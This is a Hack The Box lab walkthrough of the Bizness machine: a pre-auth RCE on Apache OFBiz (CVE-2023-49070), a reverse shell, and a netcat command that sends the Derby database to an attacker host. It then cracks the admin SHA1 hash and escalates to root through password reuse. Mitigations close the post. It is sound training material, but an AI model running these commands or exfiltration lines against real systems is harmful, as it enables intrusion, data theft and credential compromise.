---
title: "HTB Walkthrough: Bizness"
date: 2026-09-24
draft: false
description: "Full walkthrough of the Bizness machine from Hack The Box. Easy difficulty, Linux. Pre-authentication RCE on Apache OFBiz (CVE-2023-49070) → exfiltration of the embedded Apache Derby database → cracking the admin SHA1 hash → privilege escalation to root via password reuse."
tags: ["HackTheBox", "Linux", "Easy", "OFBiz", "CVE-2023-49070", "RCE", "ApacheDerby", "HashCracking", "PasswordReuse", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Bizness** on Hack The Box. **Easy** difficulty machine running **Linux**. The server exposes **Apache OFBiz 18.12**, vulnerable to **CVE-2023-49070** — a pre-authentication RCE caused by unsafe deserialization in the XML-RPC endpoint. From the shell obtained as `ofbiz`, the embedded **Apache Derby** database is located, exfiltrated, and analysed locally with the `ij` client, revealing the SHA1 hash of the admin password. After cracking it with `hashcat`, the password turns out to be the **root** password of the OS as well — a classic cross-layer credential reuse.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                               |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | Bizness                                                                                                                              |
| **OS**         | Linux                                                                                                                                |
| **Difficulty** | Easy                                                                                                                                 |
| **IP**         | 10.129.19.87                                                                                                                         |
| **Techniques** | CVE-2023-49070 pre-auth RCE · Apache Derby exfiltration · SHA1 hash cracking (hashcat -m 120) · Password reuse to root              |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.19.87
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
34747/tcp open  unknown
```

```bash
echo "10.129.19.87 bizness.htb" >> /etc/hosts
```

### 1.2 Web Service Detection

```bash
nmap -sC -sV -p80,443 10.129.19.87
```

> **💡 Attack surface:** ports 80/443 serve an application built on **Apache OFBiz**, an open-source ERP. The version can be identified from response headers and the login page at `/content/control/main`.

---

## 2. Web Enumeration

```bash
feroxbuster -k -u https://bizness.htb
```

```
200  GET  /content/control/main
302  GET  /accounting → /accounting/control/main
302  GET  /webtools  → /webtools/control/main
```

The scan confirms the instance is **Apache OFBiz 18.12** and that all control endpoints require authentication.

> **⚠️ Vulnerable version:** Apache OFBiz **18.12** is vulnerable to **CVE-2023-49070**, a pre-authentication RCE caused by unsafe deserialization in the XML-RPC request handler. No credentials are required to exploit it.

---

## 3. Exploitation — CVE-2023-49070 (Pre-Auth RCE on Apache OFBiz)

### 3.1 Set Up the Listener

```bash
nc -nlvp 4444
```

### 3.2 Run the Exploit

```bash
python3 CVE-2023-49070.py https://bizness.htb/ 10.10.14.211:4444
```

```
Normal flow:    legitimate XML-RPC request → OFBiz processes parameters safely
Malicious flow: XML-RPC request with malicious serialized object → unsafe deserialization
                → arbitrary command executed before any authentication check
                → outbound connection → reverse shell as ofbiz
```

### 3.3 Receive and Stabilise the Shell

```
Listening on 0.0.0.0 4444
Connection received on 10.129.19.87 33338
bash: cannot set terminal process group (623): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
stty rows 40 cols 150
reset
```

> **💡 Why it works:** OFBiz 18.12's XML-RPC endpoint deserialises user-supplied data without validating its origin, allowing arbitrary code execution before any authentication check. The patch enforces signature validation during deserialisation.

---

## 4. User Flag

```bash
cat /home/ofbiz/user.txt
```

> 🔑 User flag obtained.

---

## 5. Post-Exploitation — Apache Derby Database

### 5.1 Password Hashing Scheme

```bash
cat framework/security/config/security.properties | grep hash
```

```
password.encrypt.hash.type=SHA
```

> **💡 Key finding:** OFBiz uses **SHA** to hash its own application-user passwords. The actual format stored in the database is `$SHA$<salt>$<base64url_hash>` — crackable offline if the password is weak.

### 5.2 Locating the Embedded Database

By default, Apache OFBiz uses **Apache Derby** as its embedded database:

```bash
ls /opt/ofbiz/runtime/data/derby/
```

```
derby.log  ofbiz  ofbizolap  ofbiztenant
```

---

## 6. Exfiltrating the Derby Database

### 6.1 Compress and Verify

```bash
cd /opt/ofbiz/runtime/data/
tar -czf /tmp/derby.tar.gz derby
md5sum /tmp/derby.tar.gz
```

```
8517b4cff97974d8dd996a54c69cfb97  /tmp/derby.tar.gz
```

### 6.2 Transfer via `nc`

On the attacker machine:

```bash
nc -lvnp 80 > derby.tar.gz
```

On the victim:

```bash
cat /tmp/derby.tar.gz | nc 10.10.15.193 80
```

Verify integrity locally:

```bash
md5sum derby.tar.gz
```

```
8517b4cff97974d8dd996a54c69cfb97  derby.tar.gz
```

```bash
tar -xzf derby.tar.gz && ls derby/
```

```
derby.log  ofbiz  ofbizolap  ofbiztenant
```

---

## 7. Database Analysis with `ij`

`ij` is the interactive CLI client bundled with Apache Derby.

```bash
ij
```

```
ij version 10.14
ij> connect 'jdbc:derby:./ofbiz';
```

### 7.1 Explore the Schema

```sql
ij> show SCHEMAS;
```

```
TABLE_SCHEM
-----------
APP
NULLID
OFBIZ
SQLJ
SYS
...
12 rows selected
```

```sql
ij> describe OFBIZ.USER_LOGIN;
```

```
COLUMN_NAME          TYPE_NAME
USER_LOGIN_ID        VARCHAR
CURRENT_PASSWORD     VARCHAR
PASSWORD_HINT        VARCHAR
...
```

### 7.2 Extract User Credentials

```sql
ij> select USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT from OFBIZ.USER_LOGIN;
```

```
USER_LOGIN_ID | CURRENT_PASSWORD                      | PASSWORD_HINT
system        | NULL                                  | NULL
anonymous     | NULL                                  | NULL
admin         | $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I    | NULL

3 rows selected
```

> **🔑 Hash obtained:** the `admin` hash follows the format `$SHA$<salt>$<base64url_hash>` — the salt is the single character `d` and the hash is base64 URL-safe encoded.

---

## 8. Cracking the `admin` Hash

### 8.1 Decode from Base64 URL-Safe to Hex

```python
import base64
s = 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
s += '=' * (-len(s) % 4)
print(base64.urlsafe_b64decode(s).hex())
```

```
b8fd3f41a541a435857a8f3e751cc3a91c174362
```

### 8.2 Prepare for `hashcat` (format `sha1($salt.$pass)`)

```bash
echo "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" > hash.txt
```

### 8.3 Crack with `hashcat`

```bash
hashcat hash.txt -m 120 /usr/share/wordlists/rockyou.txt
```

```
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness

Status: Cracked
Hash.Mode: 120 (sha1($salt.$pass))
Recovered: 1/1 (100.00%)
```

> **🔑 Password obtained:** `monkeybizness`

---

## 9. Privilege Escalation — Password Reuse to Root

```bash
su -
```

```
Password: monkeybizness
root@bizness:~#
```

```
Normal flow:    application accounts and OS accounts use independent passwords
Malicious flow: cracked OFBiz admin password == OS root password
                → su - with the same password → instant root
```

> **⚠️ Critical exposure:** the password of the OFBiz `admin` application user is identical to the `root` OS account password — credential reuse across layers that should never share secrets.

---

## 10. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 11. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap reveals ports 80/443. Enumeration identifies Apache OFBiz 18.12.
2. **CVE-2023-49070** → Pre-auth RCE via unsafe deserialization in the XML-RPC endpoint → reverse shell as `ofbiz`.
3. **User flag** → `/home/ofbiz/user.txt`.
4. **Derby DB** → `security.properties` reveals SHA hash scheme. Embedded database located at `/opt/ofbiz/runtime/data/derby/`.
5. **Exfiltration** → compressed with `tar` + transferred via `nc` → analysed locally with `ij`.
6. **Hash cracking** → base64url decode → `hashcat -m 120` + `rockyou.txt` → password `monkeybizness`.
7. **Root** → `su -` with the same password → `root@bizness`.

**What I learned from this machine:**

- **CVE-2023-49070 demonstrates that deserialization without validation is RCE.** OFBiz 18.12 processes Java serialized objects in the XML-RPC endpoint before authenticating the sender. No credentials are needed — only the correct payload. The fix is to disable unnecessary endpoints and validate signatures before deserialising.

- **Embedded databases are an overlooked exfiltration vector.** Apache Derby stores all data — including application-user credentials — as files on disk, readable by the service account. An attacker with a shell can compress and exfiltrate the entire database without touching any database port.

- **OFBiz's custom hash format (SHA1 with a short salt) is weak by modern standards.** `sha1($salt.$pass)` with a single-character salt offers no meaningful resistance to GPU dictionary attacks. `hashcat -m 120` with `rockyou.txt` cracks it in seconds. Modern systems must use bcrypt, scrypt, or Argon2 with a long per-user salt.

- **Password reuse across layers multiplies blast radius.** Compromising an application user's password (`admin` in OFBiz) should not grant access to the OS. When passwords are shared, the weakest layer simultaneously compromises all others.

- **`ij` lets you analyse a Derby database entirely offline.** Just having the files on disk and connecting locally with `jdbc:derby:./ofbiz` is sufficient. The exfiltration is entirely passive — no network queries to detect.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2023-49070 — Pre-auth RCE on Apache OFBiz 18.12 | Update OFBiz to a patched version; disable the XML-RPC endpoint if unused; restrict access from untrusted networks |
| Apache Derby database exfiltrable by the service account | Apply least privilege to the process; restrict read permissions on the data directory; consider an external database with separate credentials |
| SHA1 hash with a short salt, crackable offline | Migrate to bcrypt, scrypt, or Argon2 with a long random per-user salt; never use SHA/MD5 to store passwords |
| Weak password present in common dictionaries (`monkeybizness`) | Enforce complexity policies; audit new passwords against known leaked dictionaries |
| Password reuse between application user and root OS account | Never share credentials between application accounts and OS accounts; independent secrets management per layer |
| Service process with excessive filesystem access | Run OFBiz as an unprivileged user; apply chroot or containers to restrict the accessible filesystem |
